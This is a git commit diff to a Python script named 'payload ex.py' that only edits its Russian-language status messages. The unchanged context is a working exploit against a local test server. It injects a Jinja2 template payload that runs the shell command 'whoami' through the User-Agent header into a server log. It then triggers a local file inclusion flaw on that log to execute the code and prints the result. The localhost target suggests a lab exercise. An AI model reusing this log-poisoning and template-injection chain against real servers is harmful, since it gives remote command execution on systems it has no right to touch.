76c6928dca76f93bde7cdcdbed13fe43dc6d6358
catharsis <gugass893@gmail.com>
2026-05-23 23:01:53 +0500

    Fix print statements for consistency in payload ex.py

--- payload ex.py
+++ payload ex.py
@@ -2,7 +2,7 @@ import requests
 
 TARGET_URL = "http://127.0.0.1:5000/advanced-lfi"
 
-print("[*] Запуск автоматического эксплойта...")
+print("[*] Запуск автоматического эксплойта")
 
 payload = "{{ self.__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() }}"
 
@@ -10,9 +10,9 @@ headers = {
     "User-Agent": payload  
 }
 
-print("[*] Этап 1: Отправляем вредоносный User-Agent в лог-файл сервера...")
+print("[*] 1: Отправляем вредоносный User-Agent в лог-файл сервера")
 requests.get(f"{TARGET_URL}?file=server_access.log", headers=headers)
-print("[*] Этап 2: Активируем уязвимость LFI для выполнения нашего кода...")
+print("[*] 2: Активируем уязвимость LFI для выполнения нашего кода")
 response = requests.get(f"{TARGET_URL}?file=server_access.log")
 
 print("\n[+] ОТВЕТ ОТ СЕРВЕРА (Результат выполнения команды):")
